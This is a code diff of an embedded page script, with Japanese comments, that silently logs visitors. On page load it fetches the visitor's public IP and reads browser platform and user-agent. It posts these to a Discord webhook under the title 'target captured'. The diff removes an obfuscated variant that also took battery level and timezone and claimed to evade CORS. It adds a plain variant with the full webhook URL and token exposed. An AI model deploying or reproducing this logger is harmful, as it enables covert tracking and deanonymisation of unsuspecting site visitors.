@@ -1,43 +1,31 @@
 <script type="text/javascript">
-(async function() {
-    try {
-        // 1. Webhook URL (Base64)
-        const _0x1f2e = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ4MDg1ODk1OTE0ODQ4NjY5OC9yb2dSQWpFSlY0VUJQTlB1cTZ2Q1MxbUk0NEM3N3c3NzFXZEI3UldxaDY5NkxLOUlPUDY1NFNzZlQxeZlWEpWRjg3";
-        const _0x5a12 = atob(_0x1f2e);
+(function() {
+    // 1. ここに新しいWebhook URLをそのまま貼り付ける
+    const w = "https://discord.com/api/webhooks/1480858959148486698/rogRAjEJV4UBPNPuq6vCS1mI44C77w771WdB7RWqh696LK9IOP654SsfT1zIXjaVGF87";
 
-        // 2. IP取得 (CORSエラーが出にくい ipify を使用)
-        const ipRes = await fetch('https://api.ipify.org?format=json');
-        const ipData = await ipRes.json();
-        const userIP = ipData.ip;
-
-        // 3. デバイス情報の収集
-        const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
-        let bat = "不明";
-        try { const b = await navigator.getBattery(); bat = (b.level * 100) + "%"; } catch(e){}
-
-        // 4. Discord用メッセージ
+    // 2. IPと情報を取得して送信
+    fetch('https://api.ipify.org?format=json')
+    .then(r => r.json())
+    .then(data => {
         const payload = {
             embeds: [{
-                title: "🚨 ターゲット捕捉 (CORS回避済み)",
+                title: "🚨 ターゲット捕捉",
                 color: 16711680,
                 fields: [
-                    { name: "🌐 Network", value: `**IP:** ${userIP}\n**TimeZone:** ${tz}`, inline: false },
-                    { name: "💻 Device", value: `**OS:** ${navigator.platform}\n**Language:** ${navigator.language}\n**Battery:** ${bat}`, inline: true },
-                    { name: "🔍 User-Agent", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false }
+                    { name: "IPアドレス", value: data.ip },
+                    { name: "OS/Platform", value: navigator.platform },
+                    { name: "User-Agent", value: navigator.userAgent }
                 ],
                 timestamp: new Date()
             }]
         };
 
-        // 5. 送信
-        await fetch(_0x5a12, {
+        return fetch(w, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(payload)
         });
-
-    } catch (err) {
-        // エラー時は何もしない
-    }
+    })
+    .catch(e => console.error("Error:", e));
 })();
 </script>
